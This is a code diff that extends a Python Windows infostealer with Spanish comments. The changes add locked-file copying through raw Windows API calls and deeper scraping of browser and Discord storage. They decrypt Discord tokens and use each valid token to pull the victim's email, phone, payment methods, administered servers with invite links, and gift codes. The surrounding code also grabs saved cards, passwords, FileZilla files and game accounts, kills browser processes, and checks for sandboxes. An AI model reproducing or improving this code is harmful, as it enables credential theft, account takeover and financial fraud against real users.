@@ -40,14 +40,23 @@ import sys
 import tempfile
 import time
 from datetime import datetime
-from getpass import getuser
 
-try:
-    from Cryptodome.Cipher import AES, DES3, ChaCha20_Poly1305
-    from Cryptodome.Util.Padding import unpad
-except ImportError:
-    from Crypto.Cipher import AES, DES3, ChaCha20_Poly1305
-    from Crypto.Util.Padding import unpad
+_CIPHERS = None
+
+
+def _ciphers():
+    global _CIPHERS
+    if _CIPHERS is not None:
+        return _CIPHERS
+    try:
+        from Cryptodome.Cipher import AES, DES3, ChaCha20_Poly1305
+        from Cryptodome.Util.Padding import unpad
+    except ImportError:
+        from Crypto.Cipher import AES, DES3, ChaCha20_Poly1305
+        from Crypto.Util.Padding import unpad
+    _CIPHERS = (AES, DES3, ChaCha20_Poly1305, unpad)
+    return _CIPHERS
+
 
 try:
     import psutil
@@ -65,6 +74,20 @@ HOME = os.environ.get("USERPROFILE", os.path.expanduser("~"))
 PROG = os.environ.get("ProgramData", r"C:\ProgramData")
 CNW = 0x08000000
 _TMPDIR = None
+_INVALID_HANDLE = ctypes.c_void_p(-1).value
+
+
+def _username():
+    for getter in (lambda: os.environ.get("USERNAME"),
+                   lambda: os.environ.get("USER"),
+                   lambda: os.getlogin()):
+        try:
+            value = getter()
+            if value:
+                return value
+        except Exception:
+            pass
+    return "?"
 
 
 def _run_dir():
@@ -82,15 +105,43 @@ def create_temp(_dir=None):
     return os.path.join(d, name)
 
 
+def _copy_locked(src, dst):
+    """Copia un archivo aunque el proceso dueno lo tenga abierto."""
+    if not os.path.isfile(src):
+        return False
+    try:
+        shutil.copyfile(src, dst)
+        return True
+    except Exception:
+        pass
+    try:
+        k32 = ctypes.windll.kernel32
+        k32.CreateFileW.restype = wt.HANDLE
+        h = k32.CreateFileW(str(src), 0x80000000, 0x7, None, 3, 0, None)
+        if not h or not h.value or (h.value & 0xFFFFFFFFFFFFFFFF) == _INVALID_HANDLE:
+            return False
+        try:
+            with open(dst, "wb") as out:
+                buf = ctypes.create_string_buffer(1 << 20)
+                got = wt.DWORD(0)
+                while k32.ReadFile(h, buf, len(buf), ctypes.byref(got), None):
+                    if not got.value:
+                        break
+                    out.write(buf.raw[:got.value])
+            return True
+        finally:
+            k32.CloseHandle(h)
+    except Exception:
+        return False
+
+
 def _copy_db(path):
     if not os.path.isfile(path):
         return None
     tmp = create_temp()
-    try:
-        shutil.copy2(path, tmp)
+    if _copy_locked(path, tmp):
         return tmp
-    except Exception:
-        return None
+    return None
 
 
 class _DATA_BLOB(ctypes.Structure):
@@ -283,6 +334,13 @@ DISCORD_DIRS = [
 
 DISCORD_EXES = ["discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe"]
 
+DISCORD_SUBDIRS = [
+    ("Local Storage", "leveldb"),
+    ("Local Storage",),
+    ("Session Storage",),
+    ("IndexedDB",),
+]
+
 
 def kill_discord():
     if psutil is not None:
@@ -299,17 +357,16 @@ def kill_discord():
 
 
 def _safe_leveldb(src):
+    """Copia el arbol completo (leveldb + IndexedDB) tolerando bloqueos."""
     tmp = create_temp()
     os.makedirs(tmp, exist_ok=True)
     try:
-        for fn in os.listdir(src):
-            p = os.path.join(src, fn)
-            if not os.path.isfile(p):
-                continue
-            try:
-                shutil.copyfile(p, os.path.join(tmp, fn))
-            except Exception:
-                pass
+        for base, _dirs, files in os.walk(src):
+            rel = os.path.relpath(base, src)
+            dst_dir = tmp if rel == "." else os.path.join(tmp, rel)
+            os.makedirs(dst_dir, exist_ok=True)
+            for fn in files:
+                _copy_locked(os.path.join(base, fn), os.path.join(dst_dir, fn))
     except Exception:
         pass
     return tmp
@@ -317,9 +374,10 @@ def _safe_leveldb(src):
 
 def _scan_file(path, store, label, mkey=None, vkey=None):
     try:
-        if os.path.getsize(path) > 40 * 1024 * 1024:
-            return 0
+        size = os.path.getsize(path)
     except Exception:
+        return 0
+    if not size or size > 80 * 1024 * 1024:
         return 0
     raw = _read_text(path)
     if not raw:
@@ -327,12 +385,16 @@ def _scan_file(path, store, label, mkey=None, vkey=None):
     hits = 0
     for m in ENC_RE.findall(raw):
         try:
-            tok = decrypt_value(base64.b64decode(m), mkey, vkey)
-            if tok:
-                _add_token(store, tok, label)
-                hits += 1
+            blob = base64.b64decode(m)
         except Exception:
-            pass
+            continue
+        try:
+            tok = decrypt_value(blob, mkey, vkey)
+        except Exception:
+            tok = ""
+        if tok:
+            _add_token(store, tok, label)
+            hits += 1
     for m in TOKEN_RE.findall(raw):
         _add_token(store, m, label)
         hits += 1
@@ -352,6 +414,24 @@ def _scan_dir(path, store, label, mkey=None, vkey=None, deep=False):
                 total += _scan_dir(p, store, label, mkey, vkey, deep)
             continue
         total += _scan_file(p, store, label, mkey, vkey)
+    return total
+
+
+def _harvest(store, root, label, subdirs):
+    if not os.path.isdir(root):
+        return 0
+    mkey = master_key(root)
+    vkey = v20_key(root)
+    total = 0
+    for sub in subdirs:
+        p = os.path.join(root, *sub)
+        if not os.path.isdir(p):
+            continue
+        tmp = _safe_leveldb(p)
+        try:
+            total += _scan_dir(tmp, store, label, mkey, vkey, deep=True)
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
     return total
 
 BROWSER_EXES = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "vivaldi.exe",
@@ -446,6 +526,7 @@ def cng_decrypt(data):
 
 
 def derive_v20_key(blob):
+    AES, DES3, ChaCha20_Poly1305, unpad = _ciphers()
     off = 0
     hlen = struct.unpack_from("<I", blob, off)[0]
     off += 4 + hlen
@@ -504,6 +585,7 @@ def decrypt_value(blob, mkey, vkey=None):
     if not blob:
         return ""
     try:
+        AES, DES3, ChaCha20_Poly1305, unpad = _ciphers()
         if blob[:3] == b"v10" and mkey:
             iv, payload = blob[3:15], blob[15:]
             return AES.new(mkey, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode("utf-8", "replace")
@@ -800,11 +882,11 @@ def grab_games():
             if os.path.isfile(p):
                 out.append("\n[FileZilla :: {}]\n".format(f) + _read(p)[:6000] + "\n")
 
-    return "".join(out) or "no accounts found"
+    return "".join(out) or "no game accounts found"
 
 
 TOKEN_RE = re.compile(r"(mfa\.[\w-]{80,90}|[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110})")
-ENC_RE = re.compile(r"dQw4w9WgXcQ:([^\"']*)")
+ENC_RE = re.compile(r"dQw4w9WgXcQ:([A-Za-z0-9+/]{40,}={0,2})")
 
 
 def _read_text(path):
@@ -828,26 +910,16 @@ def _collect_tokens():
     store = {}
 
     for name, prof, root, ls in _leveldb_dirs():
-        label = "{} ({})".format(name, prof)
-        mkey = master_key(root)
-        vkey = v20_key(root)
-        tmp = _safe_leveldb(ls)
-        _scan_dir(tmp, store, label, mkey, vkey)
-        shutil.rmtree(tmp, ignore_errors=True)
+        _harvest(store, root, "{} ({})".format(name, prof), [("Local Storage", "leveldb")])
 
+    seen_dirs = set()
     for d in DISCORD_DIRS:
-        if not os.path.isdir(d):
+        real = os.path.normcase(os.path.abspath(d))
+        if real in seen_dirs or not os.path.isdir(d):
             continue
-        label = os.path.basename(d)
-        mkey = master_key(d)
-        vkey = v20_key(d)
-        for sub in ("Local Storage/leveldb", "Local Storage", "Session Storage"):
-            p = os.path.join(d, *sub.split("/"))
-            if os.path.isdir(p):
-                _scan_dir(p, store, label, mkey, vkey)
-        idx = os.path.join(d, "IndexedDB")
-        if os.path.isdir(idx):
-            _scan_dir(idx, store, label, mkey, vkey, deep=True)
+        seen_dirs.add(real)
+        label = os.path.basename(os.path.normpath(d)) or d
+        _harvest(store, d, label, DISCORD_SUBDIRS)
 
     ff = os.path.join(ROAM, r"Mozilla\Firefox\Profiles")
     if os.path.isdir(ff):
@@ -876,9 +948,10 @@ def _leveldb_dirs():
                 yield name, "Default", root, ls
 
 
-def _api(token, path, tries=2):
+def _api(token, path, tries=2, timeout=15):
     return http_json("https://discord.com/api/v10" + path,
-                     {"Authorization": token, "User-Agent": "Mozilla/5.0"})[1]
+                     {"Authorization": token, "User-Agent": "Mozilla/5.0"},
+                     timeout=timeout)[1]
 
 
 def _account(token, source):
@@ -941,7 +1014,10 @@ def _account(token, source):
     }
 
 
-def _accounts():
+def _accounts(kill=False):
+    if kill:
+        kill_browsers()
+        kill_discord()
     store = _collect_tokens()
     seen, out = set(), []
     for token, src in store.items():
@@ -953,13 +1029,10 @@ def _accounts():
     return out
 
 
-def grab_discord(kill=False):
-    if kill:
-        kill_browsers()
-        kill_discord()
-    accs = _accounts()
+def grab_discord(kill=True):
+    accs = _accounts(kill)
     if not accs:
-        return "no valid tokens"
+        return "no valid tokens - corre 'discorddiag' para ver donde se corta"
     blocks = []
     for a in accs:
         lines = [
@@ -983,35 +1056,245 @@ def grab_discord(kill=False):
     return "\n\n".join(blocks)
 
 
-def grab_discord_json(kill=False):
-    if kill:
-        kill_browsers()
-        kill_discord()
-    return json.dumps(_accounts(), ensure_ascii=False)
-
-
 def grab_discord_diag():
     kill_browsers()
+    kill_discord()
     lines = []
+    lines.append("== rutas ==")
+    found_any = False
+    for name, root in BROWSERS.items():
+        if os.path.isdir(root):
+            found_any = True
+            ls = os.path.join(root, "Local State")
+            lines.append("  browser  {} | Local State={} | key={}".format(
+                root, os.path.isfile(ls), "ok" if (os.path.isfile(ls) and master_key(root)) else "no"))
+    for d in DISCORD_DIRS:
+        if os.path.isdir(d):
+            found_any = True
+            ls = os.path.join(d, "Local State")
+            ldb = os.path.join(d, "Local Storage", "leveldb")
+            n = len(os.listdir(ldb)) if os.path.isdir(ldb) else 0
+            lines.append("  app      {} | Local State={} | leveldb files={} | key={} | v20={}".format(
+                d, os.path.isfile(ls), n,
+                "ok" if (os.path.isfile(ls) and master_key(d)) else "no",
+                "ok" if (os.path.isfile(ls) and v20_key(d)) else "no"))
+    if not found_any:
+        lines.append("  ninguna ruta existe - Discord/browsers nunca abiertos o perfil distinto")
+
+    lines.append("")
+    lines.append("== candidatos ==")
     store = _collect_tokens()
-    lines.append("candidates : {}".format(len(store)))
+    lines.append("total: {}".format(len(store)))
     for token, src in list(store.items())[:40]:
         me = _api(token, "/users/@me")
         ok = isinstance(me, dict) and me.get("id")
-        lines.append("{} | {} | {}".format("VALID" if ok else "BAD", src, token[:40]))
-    lines.append("")
-    lines.append("paths:")
-    for name, root in BROWSERS.items():
-        if os.path.isdir(root):
-            lines.append("  browser " + root)
-    for d in DISCORD_DIRS:
-        if os.path.isdir(d):
-            lines.append("  app     " + d)
+        who = "{} ({})".format(me.get("username"), me.get("id")) if ok else "-"
+        lines.append("{} | {} | {} | {}".format("VALID" if ok else "BAD", src, who, token[:40]))
     return "\n".join(lines)
 
 
-def grab_discord_json():
-    return json.dumps(_accounts(), ensure_ascii=False)
+def grab_discord_json(kill=True):
+    return json.dumps(_accounts(kill), ensure_ascii=False)
+
+AVATAR_CDN = "https://cdn.discordapp.com/avatars/{uid}/{h}.{ext}"
+NITRO_NAMES = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
+BILLING_NAMES = {1: "Credit Card", 2: "PayPal"}
+FIELD_LIMIT = 1000
+EMBED_COLOR = 0x0084FF
+MAX_GUILDS = 8
+MAX_GIFTS = 10
+FALLBACK_INVITE = "https://youtu.be/dQw4w9WgXcQ"
+
+
+def embed_class():
+    try:
+        from discord import Embed
+        return Embed
+    except ImportError:
+        return None
+
+
+def _clip(text, limit=FIELD_LIMIT):
+    text = "-" if text in (None, "") else str(text)
+    return text if len(text) <= limit else text[:limit - 1] + "\u2026"
+
+
+def _capped(items, sep, limit=FIELD_LIMIT):
+    kept, used = [], 0
+    for item in items:
+        if used + len(item) + len(sep) > limit:
+            break
+        kept.append(item)
+        used += len(item) + len(sep)
+    return sep.join(kept)
+
+
+def _url_ok(url, timeout=8):
+    if requests is not None:
+        try:
+            return requests.head(url, timeout=timeout, allow_redirects=True).status_code == 200
+        except Exception:
+            return False
+    import urllib.request
+    try:
+        req = urllib.request.Request(url, method="HEAD")
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.status == 200
+    except Exception:
+        return False
+
+
+def _display_name(me):
+    disc = me.get("discriminator") or "0"
+    name = me.get("username") or "?"
+    return name if disc in ("0", None) else "{}#{}".format(name, disc)
+
+
+class DiscordReport:
+    """Reporte rico por cuenta. initialize(True) -> JSON, initialize(False) -> Embed."""
+
+    def __init__(self, kill=True, source=None):
+        if kill:
+            kill_browsers()
+            kill_discord()
+        self.tokens = source if source is not None else _collect_tokens()
+
+    def _avatar(self, uid, h):
+        if not h:
+            return None
+        gif = AVATAR_CDN.format(uid=uid, h=h, ext="gif")
+        if _url_ok(gif):
+            return gif
+        return AVATAR_CDN.format(uid=uid, h=h, ext="png")
+
+    def _account(self, token):
+        me = _api(token, "/users/@me")
+        if not isinstance(me, dict) or not me.get("id"):
+            return None
+        uid = me["id"]
+
+        billing = _api(token, "/users/@me/billing/payment-sources")
+        methods = []
+        if isinstance(billing, list):
+            for m in billing:
+                methods.append(BILLING_NAMES.get(m.get("type"), "Unknown"))
+
+        hq = []
+        guilds = _api(token, "/users/@me/guilds?with_counts=true")
+        if isinstance(guilds, list):
+            rows = []
+            for g in guilds:
+                try:
+                    if int(g.get("permissions", 0)) & 0x8 == 0:
+                        continue
+                except (TypeError, ValueError):
+                    continue
+                if g.get("approximate_member_count", 0) < 100:
+                    continue
+                rows.append(g)
+            rows.sort(key=lambda g: g.get("approximate_member_count", 0), reverse=True)
+            for g in rows[:MAX_GUILDS]:
+                inv = _api(token, "/guilds/{}/invites".format(g["id"]))
+                link = FALLBACK_INVITE
+                if isinstance(inv, list) and inv:
+                    link = "https://discord.gg/" + str(inv[0].get("code", ""))
+                members = g.get("approximate_member_count", 0)
+                online = g.get("approximate_presence_count", 0)
+                hq.append(
+                    "**{} ({})**\nOwner: `{}` | Members: `{} / {} / {}`\n[Join Server]({})".format(
+                        g.get("name", "?"), g["id"],
+                        "\u2705" if g.get("owner") else "\u274c",
+                        members, online, max(members - online, 0), link))
+
+        gifts = _api(token, "/users/@me/outbound-promotions/codes")
+        codes = []
+        if isinstance(gifts, list):
+            for c in gifts[:MAX_GIFTS]:
+                promo = c.get("promotion") or {}
+                codes.append(":gift: `{}`\n:ticket: `{}`".format(
+                    promo.get("outbound_title", "?"), c.get("code", "?")))
+
+        return {
+            "user": _display_name(me),
+            "id": uid,
+            "token": token,
+            "email": me.get("email"),
+            "phone": me.get("phone"),
+            "mfa": bool(me.get("mfa_enabled")),
+            "nitro": NITRO_NAMES.get(me.get("premium_type"), "None"),
+            "billing": ", ".join(methods) or "None",
+            "avatar": self._avatar(uid, me.get("avatar")),
+            "guilds": hq,
+            "gifts": codes,
+        }
+
+    def _json(self, acc):
+        return json.dumps({
+            "username": acc["user"],
+            "id": acc["id"],
+            "token": acc["token"],
+            "nitro": acc["nitro"],
+            "billing": acc["billing"],
+            "mfa": acc["mfa"],
+            "email": acc["email"] if acc["email"] else "None",
+            "phone": acc["phone"] if acc["phone"] else "None",
+            "hq_guilds": _capped(acc["guilds"], "\n\n") or None,
+            "gift_codes": _capped(acc["gifts"], "\n\n") or None,
+        }, ensure_ascii=False)
+
+    def _embed(self, acc):
+        Embed = embed_class()
+        if Embed is None:
+            return None
+        e = Embed(title=_clip("{} ({})".format(acc["user"], acc["id"]), 256),
+                  color=EMBED_COLOR)
+        if acc["avatar"]:
+            e.set_thumbnail(url=acc["avatar"])
+        e.add_field(name="\u200b\n\U0001F4DC Token:", value="```{}\n```".format(acc["token"]),
+                    inline=False)
+        e.add_field(name="\U0001F48E Nitro:", value=_clip(acc["nitro"], 100), inline=True)
+        e.add_field(name="\U0001F4B3 Billing:", value=_clip(acc["billing"], 100), inline=True)
+        e.add_field(name="\U0001F512 MFA:", value=str(acc["mfa"]), inline=True)
+        e.add_field(name="\U0001F4E7 Email:", value=_clip(acc["email"] or "None", 300), inline=False)
+        e.add_field(name="\U0001F4F3 Phone:", value=_clip(acc["phone"] or "None", 100), inline=False)
+        if acc["guilds"]:
+            e.add_field(name="\U0001F3F0 HQ Guilds:", value=_capped(acc["guilds"], "\n\n"),
+                        inline=False)
+        if acc["gifts"]:
+            e.add_field(name="\u200b\n\U0001F381 Gift Codes:", value=_capped(acc["gifts"], "\n\n"),
+                        inline=False)
+        return e
+
+    def build(self, raw_data=True):
+        out, seen = [], set()
+        for token in list(self.tokens):
+            acc = self._account(token)
+            if not acc or acc["id"] in seen:
+                continue
+            seen.add(acc["id"])
+            item = self._json(acc) if raw_data else self._embed(acc)
+            if item is not None:
+                out.append(item)
+        return out
+
+    @staticmethod
+    def initialize(raw_data=True, kill=True):
+        return DiscordReport(kill=kill).build(raw_data)
+
+
+def grab_discord_embeds(kill=True):
+    if embed_class() is None:
+        return "discord.py no instalado (pip install discord.py) - usa 'discordjson2'"
+    embeds = DiscordReport.initialize(False, kill)
+    if not embeds:
+        return "no valid tokens - corre 'discorddiag' para ver donde se corta"
+    return "\n\n".join("{}\n{}".format(e.title, json.dumps(e.to_dict(), ensure_ascii=False))
+                       for e in embeds)
+
+
+def grab_discord_json_v2(kill=True):
+    records = DiscordReport.initialize(True, kill)
+    return "\n".join(records) if records else "no valid tokens - corre 'discorddiag'"
 
 
 def _login_db(pdir):
@@ -1104,6 +1387,7 @@ def _ff_keys(seed):
 
 def _pk11_decrypt(master, b64):
     try:
+        AES, DES3, ChaCha20_Poly1305, unpad = _ciphers()
         der = base64.b64decode(b64)
     except Exception:
         return None
@@ -1137,6 +1421,7 @@ def _pk11_decrypt(master, b64):
 
 def _ff_master_key(key4, pw=""):
     try:
+        AES, DES3, ChaCha20_Poly1305, unpad = _ciphers()
         conn = sqlite3.connect(key4)
         row = conn.execute("SELECT item1, item2 FROM metadata WHERE id='password'").fetchone()
         conn.close()
@@ -1270,7 +1555,7 @@ def vm_report():
     lines = [
         "sandbox   : {}".format("DETECTED" if hits else "clean"),
         "admin     : {}".format(is_admin()),
-        "user      : {}".format(getuser()),
+        "user      : {}".format(_username()),
         "host      : {}".format(socket.gethostname()),
         "artifacts : {}".format(", ".join(hits) if hits else "none"),
     ]
@@ -1287,7 +1572,7 @@ def grab_all():
                       ("CARDS", grab_cards),
                       ("ACCOUNTS", grab_games),
                       ("PASSWORDS", grab_passwords),
-                      ("DISCORD", grab_discord),
+                      ("DISCORD", lambda: grab_discord(kill=False)),
                       ("VMPROTECT", vm_report)):
         blocks.append(BANNER)
         blocks.append(title)
@@ -1308,8 +1593,10 @@ def main():
         "cards": grab_cards,
         "games": grab_games,
         "accounts": grab_games,
-        "discord": grab_discord,
-        "discordjson": grab_discord_json,
+        "discord": lambda: grab_discord(kill=True),
+        "discordjson": lambda: grab_discord_json(kill=True),
+        "discordembed": lambda: grab_discord_embeds(kill=True),
+        "discordjson2": lambda: grab_discord_json_v2(kill=True),
         "discorddiag": grab_discord_diag,
         "passwords": grab_passwords,
         "passwd": grab_passwords,
